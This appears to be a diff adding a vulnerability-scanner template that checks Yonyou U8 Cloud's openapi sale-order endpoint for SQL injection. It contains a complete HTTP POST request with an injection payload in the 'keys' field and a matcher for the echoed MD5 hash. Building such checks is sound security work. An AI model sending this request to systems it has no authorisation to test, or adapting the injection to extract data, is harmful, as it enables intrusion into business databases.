@@ -1,0 +1,25 @@
+id: yonyou-u8c-openapi-sqli
+info:
+  name: yonyou-u8c-openapi-sqli
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /u8cloud/openapi/so.saleorder.takeback?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 181
+        
+        {
+            "pk_proposer": "1",
+            "operator": "1",
+            "pk_corp": "1",
+            "keys": ["1'and 1=LOWER(CONVERT(VARCHAR(32), HASHBYTES('MD5', '554'), 2))--"]
+        }
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 5e388103a391daabe3de1d76a6739ccd
+    matchers-condition: and
